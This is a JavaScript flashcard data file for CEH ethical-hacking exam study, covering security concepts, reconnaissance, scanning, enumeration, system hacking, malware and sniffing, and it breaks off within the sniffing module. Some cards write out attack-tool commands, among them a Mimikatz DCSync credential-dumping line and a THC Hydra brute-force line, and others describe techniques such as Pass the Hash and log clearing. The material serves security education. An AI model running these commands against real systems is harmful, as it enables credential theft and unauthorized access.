// CEHStudy Flashcard Data — All 20 Modules
// Expanded with content from multiple source repos

const CEH_DATA = {
    modules: [
        {
            id: 1,
            title: "Introduction to Ethical Hacking",
            sections: [
                {
                    title: "Information Security Principles",
                    cards: [
                        { q: "Five pillars of info security?", a: "Confidentiality—data only for authorized users/Integrity—no unauthorized changes/Availability—resources when needed/Authenticity—genuine files, comms, identities/Non-repudiation—sender can't deny sending" },
                        { q: "CIA triad?", a: "Core principles/Confidentiality: passwords, encryption, access controls/Integrity: hash functions, version control, checksums/Availability: anti-DoS protection, redundancy, backups" },
                        { q: "Risk analysis formulas?", a: "Risk = Threats × Vulnerabilities × Impact/Alt: Risk = Threat × Vulnerability × Asset Value/Risk Level = Consequence × Likelihood/ARO (Annual Rate of Occurrence)=threat events per year/SLE (Single Loss Expectancy)=monetary loss per occurrence/ALE (Annualized Loss Expectancy)=SLE × ARO" },
                        { q: "BCP (Business Continuity Plan)?", a: "Documented process keeping essential functions running during/after disaster/IR procedures, backups, recovery sites, comms plan" },
                        { q: "IR (Incident Response) + phases?", a: "Structured handling of security breaches/1) Preparation—tools, training, policies/2) Recording & Assignment—document + assign/3) Triage—severity, impact/4) Notification—alert stakeholders/5) Containment—stop further damage/6) Evidence Gathering—preserve forensic data/7) Eradication—remove threat/8) Recovery—normal operation/9) Post-Incident—lessons learned, report" },
                        { q: "Information Assurance (IA)?", a: "Starts with policy, ends with people; between = risk management/Plan→Design→Find Problems→Get Resources→Plan Fixes→Apply Controls→Verify→Train People" },
                        { q: "Continual/Adaptive Security Strategy?", a: "Security evolving with threats; RISK = Threats × Vulnerabilities × Impact/Continuous monitoring, threat intel, adaptive controls" },
                        { q: "Indicators of Compromise (IOCs)?", a: "Clues attackers leave showing a breach/Email: senders, addresses, subject lines, attachments/Network: URLs, domains, IPs/Host-based: filenames, hashes, registry keys/Behavioral: PowerShell execution, remote command execution" }
                    ]
                },
                {
                    title: "Cyber Kill Chain & MITRE ATT&CK",
                    cards: [
                        { q: "Cyber Kill Chain?", a: "Lockheed Martin attack phases/1) Reconnaissance—gather data, find vulns/2) Weaponization—payload + exploits/backdoors/3) Delivery—payload to target (email, USB, web)/4) Exploitation—run delivered code/5) Installation—backdoor/malware/6) C2—command-and-control channel/7) Actions & Objectives—steal data, destroy systems" },
                        { q: "MITRE ATT&CK framework?", a: "Adversary tactics/techniques knowledge base from real-world obs; classify + prepare for attacks/Tactics=WHY (e.g., Initial Access, Persistence), Techniques=HOW, Subtechniques=lower-level behavior, Procedures=in-the-wild examples/16 Tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact" },
                        { q: "Diamond Model of Intrusion Analysis?", a: "4 components/Adversary (WHO): APT groups, cybercriminals, insiders, hacktivists/Capability (WHAT): malware, exploits, ransomware, tools/Infrastructure (WHERE): C2 servers, malicious domains, IPs/Victim (TARGETED): orgs, individuals, systems" },
                        { q: "Cyber Threat Intelligence (CTI)?", a: "Evidence-based threat knowledge for security decisions/Strategic: execs—trends, landscapes/Tactical: security teams—TTPs, indicators/Operational: IR—timing, targets/Technical: systems/SIEM/IDS—IOCs, signatures/Lifecycle: Direction→Collection→Processing→Analysis→Dissemination→Feedback" },
                        { q: "Threat modeling?", a: "Find what can go wrong, how systems get attacked, how to mitigate/1) Identify assets, data/2) Attack trees/3) Identify threats (STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege)/4) Mitigate/5) Validate assumptions" }
                    ]
                },
                {
                    title: "Attack Types & Pen Test Phases",
                    cards: [
                        { q: "Threat actor types?", a: "White Hat: ethical, authorized/Black Hat: malicious, personal gain/Gray Hat: no auth, usually no malice/Script Kiddies: unskilled, pre-made tools/Cyber Terrorists: religious/political motives/State-Sponsored: nation states vs nations/Hacktivists: political agenda—deface/disable/Hacker Teams: skilled, share resources/Industrial Spies: corporate espionage/Insiders: trusted users from within/Criminal Syndicates: organized crime" },
                        { q: "Cyber attack types?", a: "Passive: monitoring (sniffing, eavesdropping), data not altered/Active: change/alter/delete data—higher discovery risk/Close-in: physically close (shoulder surfing)/Insider: existing access/Distribution: before delivery to customer" },
                        { q: "Pen test phases?", a: "1) Preparation—scope, allowed attacks, team, rules of engagement/2) Assessment—reconnaissance, scanning, exploitation/3) Conclusion (Post-Assessment)—report, findings, remediation" },
                        { q: "Pretexting?", a: "Fabricated scenario to engage victim + extract info; research target first; impersonates IT support, bank rep, law enforcement" },
                        { q: "Baiting?", a: "Enticing offer luring victim into a trap/Infected USB in parking lot, free downloads, exclusive content for credentials" },
                        { q: "Physical social engineering techniques?", a: "Eavesdropping: unauthorized conversations/Shoulder Surfing: screen, keyboard, password entry/Dumpster Diving: trash for sensitive docs/Impersonation: posing as legitimate/authorized" }
                    ]
                },
                {
                    title: "Ethical Hacking Overview",
                    cards: [
                        { q: "Ethical hacking?", a: "Authorized circumvention of systems to find breaches; same tools/techniques as malicious hackers—with permission, defensive purpose" },
                        { q: "Hacking types?", a: "1) White Hat—authorized security professionals/2) Black Hat—malicious/3) Gray Hat—between; no auth, typically no malice" },
                        { q: "Penetration test?", a: "Authorized simulated cyberattack on system/network/web app to find vulnerabilities/Planning, reconnaissance, attacking, reporting" },
                        { q: "Ethical hacking phases?", a: "1) Reconnaissance (Footprinting)/2) Scanning/3) Gaining Access/4) Maintaining Access/5) Covering Tracks/6) Reporting" },
                        { q: "Vulnerability assessment vs penetration testing?", a: "VA: identifies + quantifies vulnerabilities—broader, less deep/PT: actively exploits vulns for business impact—deeper, exploitation-focused" }
                    ]
                },
                {
                    title: "Ethical Hacking Frameworks",
                    cards: [
                        { q: "OSSTMM?", a: "Open Source Security Testing Methodology Manual; free open framework; standardized metrics for pen testing" },
                        { q: "PTES?", a: "Penetration Testing Execution Standard; pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting" },
                        { q: "NIST SP 800-115?", a: "NIST guide to IT security testing—planning, testing, documentation phases" }
                    ]
                }
            ]
        },
        {
            id: 2,
            title: "Footprinting & Reconnaissance",
            sections: [
                {
                    title: "TCP/IP Networking",
                    cards: [
                        { q: "TCP vs UDP?", a: "TCP (Transmission Control Protocol): connection-oriented, three-way handshake, guaranteed ordered delivery, error checking, flow control; HTTP, HTTPS, FTP, SSH, SMTP, DNS/UDP (User Datagram Protocol): connectionless, no handshake or guarantees, faster, lower overhead; TFTP, DNS, DHCP" },
                        { q: "TCP three-way handshake?", a: "1) SYN—client sends sync w/ random sequence number/2) SYN/ACK—server acks + own SYN/3) ACK—client acks, connection up/Then FIN flags close comms, RST forces termination" },
                        { q: "TCP flags?", a: "SYN (Synchronize): start negotiation/ACK (Acknowledgement): confirms receipt/RST (Reset): force termination/FIN (Finish): graceful close/URG (Urgent): out-of-band data/PSH (Push): immediate delivery/NULL: no flags (NULL scans)/XMAS: FIN+URG+PSH set" },
                        { q: "Packet crafting tools?", a: "Custom packets: NetScanTools Pro, Ostinato, packETH, LANforge FIRE, Colasoft Packet Builder/Uses: testing, scanning, custom protocol packets" }
                    ]
                },
                {
                    title: "Google Advanced Search Operators",
                    cards: [
                        { q: "Google Hacking / advanced search operators?", a: "cache: cached page from Google index/link: pages linking to URL/related: similar pages/info: Google's data about a page/site: restrict to domain/allintitle: all keywords in title/intitle: keyword in title/allinurl: all keywords in URL/inurl: keyword in URL/location: info for a location" },
                        { q: "Meta + FTP search engines?", a: "Meta (hide user IP): Startpage, MetaGear, etools.ch/FTP: NAPALM FTP Indexer, FreewareWeb, Mamont, GlobalFileSearch.com" },
                        { q: "SCADA/IoT discovery tools?", a: "Shodan: internet-connected devices/Censys: discover devices/services/ZoomEye: IoT/SCADA cyberspace search" }
                    ]
                },
                {
                    title: "DNS Records & Tools",
                    cards: [
                        { q: "Common DNS record types?", a: "A: hostname→IPv4/AAAA: hostname→IPv6/MX: domain's mail server/NS: authoritative name servers/CNAME: alias→true hostname/SOA: zone authority info/SRV: service location (LDAP, SIP)/PTR: reverse lookup IP→hostname/RP: responsible person, domain admin/owner/HINFO: hardware type + OS/TXT: text data for DKIM, SPF" },
                        { q: "DNS footprinting tools?", a: "Fierce: subdomains, DNS misconfigs, IP ranges, naming patterns/DNSRecon: hosts, subdomains/MxToolBox: DNS + email records/dig/nslookup: built-in queries" },
                        { q: "theHarvester?", a: "Email + subdomain recon/Usage: theHarvester -d microsoft -l 200 -b linkedin; -d=domain, -l=result limit (200), -b=source (linkedin, google, bing)/Collects emails, subdomains, hostnames from public sources" }
                    ]
                },
                {
                    title: "WHOIS & RIRs",
                    cards: [
                        { q: "WHOIS lookup types?", a: "Thick: complete info in searchable database/Thin: domain name only, points to full whois server/Decentralized: complete info held by independent entities (RIRs for IPs)" },
                        { q: "RIRs (Regional Internet Registries)?", a: "ARIN: Americas/AFRINIC: Africa/APNIC: Asia-Pacific/RIPE NCC: Europe, Middle East, Central Asia/LACNIC: Latin America + Caribbean" },
                        { q: "IP geolocation?", a: "Map IP→physical location; tools like IP2Location give country, region, city, latitude/longitude" }
                    ]
                },
                {
                    title: "Footprinting Automation Tools",
                    cards: [
                        { q: "Key automated footprinting tools?", a: "Maltego: visual link analysis between entities/Recon-ng: modular web-based recon framework (open-source)/FOCA: metadata/hidden info in docs/Subfinder: fast subdomain discovery/Osint Framework: OSINT tools by category/ReconDog: all-in-one (DNS, whois, port scan)/BillCipher: multi-purpose recon" },
                        { q: "FOCA?", a: "FOCA (Find Out Come Access)—metadata/hidden info in scanned documents/Office doc metadata (author, company, timestamps), hidden comments, tracked changes, network paths/usernames from properties, PDF annotations + form data" },
                        { q: "Maltego?", a: "Link analysis for OSINT + forensics; visualizes relationships between people, domains, IPs, URLs, social media accounts, companies/orgs, DNS records, infrastructure" }
                    ]
                },
                {
                    title: "Port Numbers & States",
                    cards: [
                        { q: "Port number ranges?", a: "Well Known: 0-1023 (standard services)/Registered: 1024-49,151 (specific applications)/Dynamic/Private: 49,152-65,535 (ephemeral)" },
                        { q: "Key ports + protocols?", a: "20/21 = FTP (TCP)/22 = SSH (TCP)/23 = Telnet (TCP)/25 = SMTP (TCP)/53 = DNS (TCP/UDP)/67/68 = DHCP (UDP)/69 = TFTP (UDP)/80 = HTTP (TCP)/443 = HTTPS (TCP)/445 = SMB (TCP)/3389 = RDP (TCP)" },
                        { q: "Common port states?", a: "OPEN: service accepting connections/CLOSED: no listener, port reachable/FILTERED: firewall blocks, no response/OPEN or FILTERED: can't tell which/CLOSED or FILTERED: can't tell which/netstat -an: all connections + listening ports/netstat -b: executable per open port" },
                        { q: "TCP connection states (netstat)?", a: "ESTABLISHED: active connection in use/SYN_SENT: request sent/SYN_RECEIVED: sent, waiting for response/FIN_WAIT_1/2: waiting to close/CLOSE_WAIT: remote side closed/TIME_WAIT: local closed, waiting final ACK/LISTEN: awaiting incoming" }
                    ]
                },
                {
                    title: "Footprinting Basics",
                    cards: [
                        { q: "Footprinting?", a: "Gather info on target infrastructure + applications pre-attack; first ethical-hacking phase; identifies attack vectors" },
                        { q: "Passive footprinting?", a: "Gather info without touching the target/Search engines, social media, WHOIS, public records, company websites" },
                        { q: "Active footprinting?", a: "Direct interaction with target/Network scanning, ping sweeps, DNS zone transfers, enumeration/More detectable by security systems" }
                    ]
                },
                {
                    title: "Tools & Techniques",
                    cards: [
                        { q: "WHOIS lookup?", a: "Query domain/IP registration databases; contact details, registration dates, nameservers" },
                        { q: "DNS zone transfer?", a: "Replicates DNS records across servers/Attacker (dig axfr or nslookup) can dump a domain's full host list" },
                        { q: "Google hacking?", a: "Advanced Google operators (dorks) to find exposed sensitive info/site:, filetype:, intitle:, inurl:—find databases, config files, admin panels" }
                    ]
                }
            ]
        },
        {
            id: 3,
            title: "Scanning Networks",
            sections: [
                {
                    title: "Nmap Scan Types & ICMP",
                    cards: [
                        { q: "Nmap scan types?", a: "SYN (-sS): stealth half-open, sends SYNs; default/Connect (-sT): full TCP connect, 3-way handshake/UDP (-sU): UDP ports (DNS, DHCP, SNMP)/XMAS (-sX): FIN+PSH+URG flags, RST if closed/NULL (-sN): no flags, same response as XMAS/FIN (-sF): FIN only/ACK (-sA): stateful vs stateless firewall detection/Idle (-sI): via zombie, very stealthy" },
                        { q: "Nmap Idle/Zombie scan?", a: "-sI via idle 'zombie' host—traffic appears from the zombie/Needs: 1) idle zombie w/ predictable IP ID sequence 2) zombie not communicating during scan 3) target replies to zombie, not scanner/Very stealthy—target never sees scanner IP" },
                        { q: "Nmap OS detection?", a: "-O flag; TCP/IP stack fingerprints from crafted packets/Analyzes TCP Initial TTL, window size, IP ID sequence, TCP options order/Compares vs nmap-os-db" },
                        { q: "ICMP + message types?", a: "Network-layer diagnostics/Type 0: Echo Reply (ping response)/Type 3: Destination Unreachable—Code 0 network unreachable, 1 host unreachable, 6 network unknown, 9 network admin prohibited, 13 comm admin prohibited/Type 4: Source Quench (rate limit)/Type 5: Redirect (route optimization)/Type 8: Echo Request (ping)/Type 11: Time Exceeded (traceroute)" },
                        { q: "Ping sweep?", a: "Find active hosts via ICMP Echo Requests; noisy but effective/Angry IP Scanner, SolarWinds Engineer's Toolset, Superscan, Advanced IP Scanner, PingPlotter/Nmap: nmap -sn" }
                    ]
                },
                {
                    title: "Network Scanning",
                    cards: [
                        { q: "Port scanning?", a: "Probe target ports to discover running services/SYN (stealth), Connect (full), XMAS, NULL, FIN, Idle" },
                        { q: "OS fingerprinting?", a: "Determine target OS from TCP/IP stack responses; active (crafted packets) or passive (observed traffic)" },
                        { q: "Network scanning tools?", a: "Nmap (port scanning, OS detection, script engine), Nessus, OpenVAS, Masscan, ZMap, Angry IP Scanner, Netcat" }
                    ]
                },
                {
                    title: "Vulnerability Scanning",
                    cards: [
                        { q: "Vulnerability scanner?", a: "Automated discovery of known vulns by matching config + software versions against CVE databases" },
                        { q: "Authenticated vs unauthenticated scanning?", a: "Authenticated: valid credentials, deeper assessment/Unauthenticated: external observation only—misses config issues" }
                    ]
                }
            ]
        },
        {
            id: 4,
            title: "Enumeration",
            sections: [
                {
                    title: "Enumeration Protocols & Services",
                    cards: [
                        { q: "SMTP enumeration?", a: "Verify addresses + enumerate users via VRFY, EXPN, RCPT TO; many servers disable these/smtp-user-enum, Nmap scripts (smtp-enum), Swaks" },
                        { q: "LDAP enumeration?", a: "User lists, group memberships, org structure/Ports 389 (unencrypted), 636 (LDAPS)/ldapsearch, Quest ActiveRoles Server" },
                        { q: "NetBIOS enumeration?", a: "Session Service (139) + Name Service (137/138)/Computer names, users, domains, workgroups/nbtscan, enum4linux, rpcclient" },
                        { q: "SNMP enumeration?", a: "Community strings extract system info, interface stats, routing tables, connected devices/Defaults: 'public' (read-only), 'private' (read-write)/snmpwalk, snmpget, Net-SNMP" },
                        { q: "Enumeration?", a: "Extract usernames, hostnames, IPs, services + details from target systems; beyond scanning—actionable intelligence" },
                        { q: "Commonly enumerated protocols?", a: "1) SNMP (Simple Network Management Protocol)/2) LDAP (Lightweight Directory Access Protocol)/3) NMB/NetBIOS/4) SMTP/5) FTP/6) DNS/7) SMB/CIFS" }
                    ]
                }
            ]
        },
        {
            id: 5,
            title: "Vulnerability Analysis",
            sections: [
                {
                    title: "Vulnerability Assessment Tools & Concepts",
                    cards: [
                        { q: "Popular vulnerability scanners?", a: "Nessus: industry standard, extensive plugins/OpenVAS: open-source alternative/Qualys: cloud vulnerability management/Nexpose/Rapid7: enterprise scanning/Burp Suite: web app focused/Acunetix: automated web scanner" },
                        { q: "CVE (Common Vulnerabilities and Exposures)?", a: "Dictionary of publicly disclosed vulnerabilities; each entry = unique ID (CVE-2024-1234) + description; maintained by MITRE" },
                        { q: "CVSS scoring?", a: "Rates vulns 0.0-10.0: 0.0 None/0.1-3.9 Low/4.0-6.9 Medium/7.0-8.9 High/9.0-10.0 Critical/Base metrics: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality, Integrity, Availability" },
                        { q: "Vulnerability?", a: "Exploitable weakness in system, procedures, controls, or implementation/Unpatched software, misconfigurations, weak passwords" },
                        { q: "False positives in vulnerability scanning?", a: "Reported vuln that doesn't exist—scanner misconfig, version detection errors, context exceptions; verify manually" }
                    ]
                }
            ]
        },
        {
            id: 6,
            title: "System Hacking",
            sections: [
                {
                    title: "Windows Password Storage & Authentication",
                    cards: [
                        { q: "Windows SAM password storage?", a: "Hashed (one-way) Windows passwords/%SystemRoot%\\system32\\config\\SAM → registry HKEY_LOCAL_MACHINE\\SAM/Can't copy while Windows runs/SYSKEY partially encrypts hashes/LM or NTLM hashes/pwdump7, Mimikatz, DSinternals, hashcat, PyCrack" },
                        { q: "NTLM authentication?", a: "Default Windows auth scheme; no official protocol spec/Vista+ disabled LM hashing (blank in later Windows)/Client requests access→server challenge→client response→server verifies (AD or SAM)/NTLMv2 reasonably secure, weaker than Kerberos" },
                        { q: "Kerberos authentication?", a: "Secret-key auth; upgrade from NTLM/KDC (Key Distribution Center), AS (Authentication Server), TGS (Ticket Granting Server)/Login→request ticket→receive TGT→request service access→receive Service Ticket→access service" },
                        { q: "Password dump/interception methods?", a: "Memory credential dumps/SAM database local copy/AD ntds.dit file/SYSKEY boot key/Network interception (passive sniffing, MITM)/Captures plaintext, LM, NTLM, NTLMv2, Kerberos tokens" }
                    ]
                },
                {
                    title: "Password Cracking Methods",
                    cards: [
                        { q: "Types of password attacks?", a: "Non-electronic: social engineering, dumpster diving/Active online: dictionary, brute force, rule-based, hybrid (dictionary + modifications), password spraying, hash injection, Pass the Hash (PtH), LLMNR/NBT-NS poisoning (Responder), Markov-chain/Passive online: wire sniffing at data link layer/Offline: recover from hash dump" },
                        { q: "Pass the Hash (PtH) attack?", a: "Inject compromised hash into local session to validate network resources; logged-in user hash logs into domain controller; no password cracking needed" },
                        { q: "LLMNR/NBT-NS poisoning?", a: "Windows same-link name resolution (LLMNR + NBT-NS)/Attacker spoofs responses to intercept auth/Responder—detects + performs poisoning/Vindicate, got-responded detect it" },
                        { q: "AS-REP Roasting?", a: "Crack Kerberos TGT for users without pre-authentication/Needs DC connectivity + domain account/Extract AS-REP ticket→crack offline for password" },
                        { q: "Password cracking tools?", a: "THC Hydra: hydra -l username -P wordlist.txt target/Metasploit auxiliary modules, Rubeus (Kerberos), adfsbrute, CrackMapExec/Hashcat (hash mode: hashcat -m 0 for MD5)/L0phtCrack—lost MS passwords/RainbowCrack—rainbow tables/Passware Kit, Elcomsoft Distributed Password Recovery" },
                        { q: "Password Spraying?", a: "Same common password against many accounts at once; avoids lockouts single-account brute force triggers/e.g., 'Password123' on all users" }
                    ]
                },
                {
                    title: "Metasploit Framework",
                    cards: [
                        { q: "Metasploit module types?", a: "Exploit: configure active exploit, target + payload, launch/Payload: attacker-victim channel—Singles (standalone), Stagers (set up connection), Stages (downloaded by stager)/Auxiliary: one-time actions (port scan, DoS, fuzzing); use, exploit/run/NOPs: buffer bloat instructions; msfgenerate/Encoder: hide/encode payload via polymorphism/Evasion: modify payload behavior (evasion/windows/windows_defender.exe)/Post-exploitation: interact after compromise (post/windows/gather/enum_logged_on_users)" },
                        { q: "AI-powered vulnerability exploitation tools?", a: "Nebula: AI vulnerability exploitation/DeepExploit: Metasploit-linked, AI automated pen testing" }
                    ]
                },
                {
                    title: "Buffer Overflow",
                    cards: [
                        { q: "Buffer overflow?", a: "Adjacent memory area for runtime data; overflow writes past it→overwrites neighbors/Injects malicious code, damages files, escalates privileges, gains shell/Vulns: no boundary checks, older languages, unsafe functions (gets, strcpy), no input validation, improper memory allocation" },
                        { q: "Types of buffer overflow?", a: "Stack-based: static LIFO, PUSH/POP; attacker controls EIP to replace return address; EBP=Extended Base Pointer, ESP=Extended Stack Pointer, EIP=Extended Instruction Pointer (target), ESI/EDI=Source/Destination Index/Heap-based: dynamic runtime allocation; overwrites object pointers" },
                        { q: "Return Oriented Programming (ROP)?", a: "Reuse code snippets already in the binary (libc, kernel32.dll); chain 'gadgets' ending in RET for arbitrary execution" },
                        { q: "Heap Spraying?", a: "Flood process free memory with copies of malicious code; raises code-execution odds with overflow exploits" },
                        { q: "Buffer overflow exploitation tools?", a: "Spiking: crafted TCP/UDP packets to crash; nc -nv ip port, STATS template/Fuzzing: Python while-loop scripts; pattern_create + pattern_offset find EIP overwrite offset (Metasploit)/Metasploit exploit modules/OllyDbg: Windows debugger" }
                    ]
                },
                {
                    title: "Privilege Escalation",
                    cards: [
                        { q: "Privilege Escalation types?", a: "Horizontal: access resources of a user with similar permissions/Vertical: gain higher privilege (user→admin/root)" },
                        { q: "DLL/Dylib Hijacking attacks?", a: "DLL Hijacking (Windows): malicious DLL in app library path; Spartacus/Dylib Hijacking (macOS): dynamic library attacks; Dylib Hijack Scanner/Detection: Dependency Walker, Dylib Hijack Scanner" },
                        { q: "Meltdown and Spectre?", a: "Spectre: AMD, Apple, ARM, Intel; speculative execution reads restricted data/Meltdown: all ARM + Intel CPUs; out-of-bounds memory access" },
                        { q: "DCSync attack?", a: "Privileged account w/ domain replication rights→create virtual DC like original AD/Extracts NTLM hashes, enables Golden Ticket/Mimikatz—lsadump::dcsync /domain:(domain) /user:Administrator" },
                        { q: "Golden Ticket attack?", a: "Forge TGT post-exploitation/Needs KRBTGT password hash/Access to ANY domain service, indefinitely/Mimikatz" },
                        { q: "Silver Ticket attack?", a: "Steal user creds, forge Service Ticket (TGS not TGT)/Specific service access only, not whole domain/Mimikatz" },
                        { q: "Other privilege escalation techniques?", a: "Named Pipe Impersonation (Metasploit)/Unquoted Service Paths/Service Object Permissions/NFS misconfig (2049): showmount, mount/UAC Bypass: FodHelper, eventvwr Registry, COM handler hijack/Boot/Login abuse: Logon + RC scripts, StartupItems/Group Policy: New-GPOImmediateTask/ADCS abuse—Certipy/Access Token Manipulation/Parent PID Spoofing/App Shimming (UAC bypass)/SID-History Injection/COM Hijacking/Scheduled Tasks/Setuid/Setgid (Linux/macOS)/Web Shell" },
                        { q: "Privilege Escalation tools?", a: "BeRoot: post-exploitation privesc/PowerSploit, PowerView: PowerShell post-exploitation/PEASS-ng/WinPEAS: Windows enumeration/FullPowers: macOS privesc/pwncat: reverse shell + priv tools/Traitor: Linux privesc" }
                    ]
                },
                {
                    title: "Maintaining Access",
                    cards: [
                        { q: "Methods for maintaining access?", a: "Backdoors: unauthorized access/Keyloggers: hardware or software (Metasploit remote keylogger, REFOG, NetBull)/Spyware: screenshots + monitoring (Spytech SpyAgent, iKeyMonitor)/Rootkits: hide presence—hypervisor, firmware, kernel, boot-loader, application, library, memory level/NTFS Alternate Data Streams: hidden file streams; StreamArmor, GMER, ADS Scanner/Steganography: data in images/audio/video; OpenStego, StegoOnline, DeepSound" },
                        { q: "Remote Code Execution techniques?", a: "Web-browser exploitation (spear phishing)/Office-app exploitation/WMI (Windows Management Instrumentation)/WinRM (Windows Remote Management)/Dameware, Ninja, Pupy, PsExec, PDQ Deploy, ManageEngine Endpoint Central" },
                        { q: "Active Directory persistence attacks?", a: "Skeleton Key: false credentials, memory-resident virus (Mimikatz)/Overpass the Hash: pass-the-ticket/hash extension (Mimikatz)/Malicious Replication: copy user data w/ admin creds/WMI Event Subscription (PowerLurk)/AdminSDHolder abuse: SDProp protects high-privilege accounts" },
                        { q: "Hiding evidence of compromise?", a: "Disable auditing + Windows functionality/Clear, manipulate logs (Metasploit meterpreter)/Cover tracks on network/OS/Delete files, hide artifacts/cipher.exe secure file deletion" }
                    ]
                },
                {
                    title: "Hacking Methods",
                    cards: [
                        { q: "Hacker methodology?", a: "1) Gaining Access/2) Escalating Privileges/3) Executing Applications/4) Hiding Files/Processes/5) Harvesting Credentials/6) Exploiting Weaknesses/7) Lateral Movement" },
                        { q: "Privilege escalation (definition)?", a: "Exploit a bug, design flaw, or misconfiguration for elevated access to protected resources/Vertical (to admin/root), horizontal (same-level user)" },
                        { q: "System hacking tools?", a: "Mimikatz (credential dumping), Metasploit (exploitation framework), John the Ripper/Hashcat (password cracking), Netcat (network tool), PowerShell Empire (post-exploitation), Cobalt Strike" }
                    ]
                }
            ]
        },
        {
            id: 7,
            title: "Malware Threats",
            sections: [
                {
                    title: "Advanced Malware Types",
                    cards: [
                        { q: "How does fileless malware work?", a: "Lives entirely in memory, never touches disk/Legitimate tools for execution (PowerShell, WMI)/Hard for traditional AV/e.g., PowerShell -encodedcommand, WMI event subscriptions" },
                        { q: "How does polymorphic malware evade AV?", a: "Changes code signature each replication; algorithm intact/Mutation engines evade signature-based AV/Metamorphic instead rewrites ENTIRE code structure" },
                        { q: "How does metamorphic malware work?", a: "Rewrites entire code structure each infection/Same function, different code/More advanced than polymorphic—signature AND behavior change" },
                        { q: "Logic bomb?", a: "Triggered by date/event/password; dormant until trigger/Often planted by disgruntled insiders" },
                        { q: "Worm vs virus—spread mechanisms?", a: "Virus: needs host file + human action (open attachment, run program)/Worm: standalone, self-replicates across networks w/o user interaction/Worms faster; viruses more destructive" },
                        { q: "Trojan types?", a: "Downloader: pulls additional malware/Dropper: deploys other malware/Backdoor: unauthorized access channel/DDoS: joins botnet/Banking: steals financial credentials/RAT (Remote Access): full remote control" }
                    ]
                },
                {
                    title: "APT & Botnets",
                    cards: [
                        { q: "APT (Advanced Persistent Threat)?", a: "Sophisticated, long-term targeted attack; stays undetected/State-sponsored or highly organized/Custom malware + zero-days/APT28 (Fancy Bear), APT29 (Cozy Bear), Lazarus Group" },
                        { q: "Botnet C&C models + examples?", a: "Compromised computers (bots/zombies) controlled by C&C servers/DDoS, spam, cryptomining, credential stuffing/Models: Hub-and-spoke, P2P, DNS-based/Mirai (IoT), Emotet, TrickBot, QakBot" },
                        { q: "Cryptomining malware: variants + signs?", a: "Hijacks victim resources to mine crypto (Proof-of-Work puzzles)/'Cryptojacking'/Inline (web-based) or installed (malware)/Signs: high CPU/GPU, higher power use" },
                        { q: "Ransomware + types?", a: "Encrypts files, demands payment/Crypto-ransomware: encrypts files/Locker-ransomware: locks device/screen/Double Extortion: steals data THEN encrypts (leak threat)/WannaCry, Ryuk, LockBit, BlackCat/ALPHV" },
                        { q: "Stuxnet worm?", a: "Discovered 2010; targeted Iranian nuclear facilities/Siemens SCADA attack disrupted centrifuges/Multiple zero-days/First cyberweapon on physical infrastructure/APT capability with nation-state resources" }
                    ]
                },
                {
                    title: "Malware Analysis",
                    cards: [
                        { q: "Malware analysis methods?", a: "Static—no execution: disassembly, strings, header analysis, file hash (MD5, SHA256), PE analysis/Dynamic—controlled run: sandbox (Cuckoo, Joe Sandbox), network traffic, file modifications, registry changes, process behavior" },
                        { q: "Malware analysis tools?", a: "Static: IDA Pro, Ghidra, PEiD, strings, exiftool/Dynamic: Cuckoo, ANY.RUN, Joe Sandbox/Debuggers: OllyDbg, x64dbg, GDB/Network: Wireshark, TCPView/Monitoring: Process Monitor, Process Explorer, API Monitor/Memory: Volatility" },
                        { q: "Social engineering vectors for malware delivery?", a: "Trick users into running malware/Phishing emails w/ malicious attachments/Drive-by downloads from compromised sites/Malicious USB (Baiting)/Compromised software updates/Fake security alerts" },
                        { q: "Rootkit: levels + detection?", a: "Hides attacker presence/Levels: user-mode, kernel-mode, hypervisor, firmware/BIOS, boot-loader/Detection: integrity-based (Tripwire, AIDE), memory dumps, process-list comparison/GMER (SirMed), Stinger, TDSSKiller, Avast One" }
                    ]
                },
                {
                    title: "Malware Overview",
                    cards: [
                        { q: "Malware?", a: "Intentionally harmful program/file/Viruses, worms, trojans, ransomware, spyware, adware, rootkits, logic bombs" },
                        { q: "Virus vs worm—key difference?", a: "Virus needs host file + human action/Worm: standalone, self-replicates across networks without user action" },
                        { q: "Trojan horse?", a: "Malicious code disguised as legitimate software; does NOT self-replicate/Downloaders, droppers, backdoor, DDoS trojans" },
                        { q: "Ransomware?", a: "Encrypts files, demands payment/Crypto (encrypts files), locker (locks screen)/Double extortion—steal + encrypt" },
                        { q: "Rootkit?", a: "Hides attacker presence/User-mode, kernel-mode, hypervisor-level, firmware/BIOS" },
                        { q: "Polymorphic malware?", a: "Changes signature each replication; algorithm intact/Mutation engines evade signature-based AV" },
                        { q: "Metamorphic malware?", a: "Rewrites entire code structure each infection—same function, different code/More advanced: changes signature AND behavior" },
                        { q: "Fileless malware?", a: "Entirely in memory, no disk writes/Legitimate tools (PowerShell, WMI)—hard for traditional AV" },
                        { q: "What defines an APT?", a: "Sophisticated, long-term targeted attack; stays undetected/State-sponsored/highly organized; custom malware + zero-days" },
                        { q: "Cryptomining malware?", a: "Hijacks victim resources to mine crypto without consent/Proof-of-Work puzzles/'Cryptojacking'" },
                        { q: "How to analyze malware?", a: "Static—examine code without running (disassembly, strings, headers)/Dynamic—sandbox/VM run; observe network connections, file modifications, registry changes" },
                        { q: "Social engineering + malware distribution?", a: "Trick users into executing malware/Phishing emails, malicious attachments, drive-by downloads, compromised websites" },
                        { q: "Botnet?", a: "Compromised computers (bots/zombies) via C&C servers/DDoS, spam, cryptomining" }
                    ]
                }
            ]
        },
        {
            id: 8,
            title: "Sniffing",
            sections: [
                {
                    title: "Network Sniffing & Switched Networks",
                    cards: [
                        { q: "Network sniffing (how it works)?", a: "Capture + analyze network traffic; legitimate troubleshooting or credential theft/Easy on hubs, harder on switches/Captures passwords, emails, files, session tokens" },
                        { q: "ARP poisoning / spoofing—how it works?", a: "Fake ARP messages link attacker's MAC to a legit device's IP/Enables MITM—victim traffic flows through attacker/Intercepted, modified, dropped/Primary switched-network sniffing method" },
                        { q: "Sniffing + MitM tools?", a: "Wireshark: packet analyzer (GUI)/Tcpdump: command-line capture (Linux/macOS)/Cain & Abel: cracker + sniffer (Windows)/Bettercap: attack + monitoring/Responder: LLMNR/NBT-NS/mDNS poisoner, credential harvester/Ethereal (old Wireshark name), X-Wireshark" },
